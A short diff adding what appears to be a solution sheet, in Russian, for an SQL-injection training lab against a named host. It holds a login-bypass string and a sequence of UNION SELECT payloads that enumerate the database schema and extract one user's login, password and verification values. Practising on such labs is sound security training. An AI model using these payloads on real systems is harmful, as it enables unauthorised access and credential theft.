@@ -1,0 +1,6 @@
+Ссылка на хост: http://injections.freakazo1d.ru
+Ввод фрагмента a' OR 'x'='x'#; в поле «Login».
+a' UNION SELECT 1,NULL,3,4,GROUP_concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema<>'information_schema';#
+a' UNION SELECT 1,2,3,4,GROUP_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='t7Ya174zey';#
+a' UNION SELECT 1,login,3,4,password FROM K9RQ3L3uPT WHERE login LIKE '%maksimenkova%';#
+a' UNION SELECT 1,login,3,4,verification FROM K9RQ3L3uPT WHERE login LIKE '%maksimenkova%';#
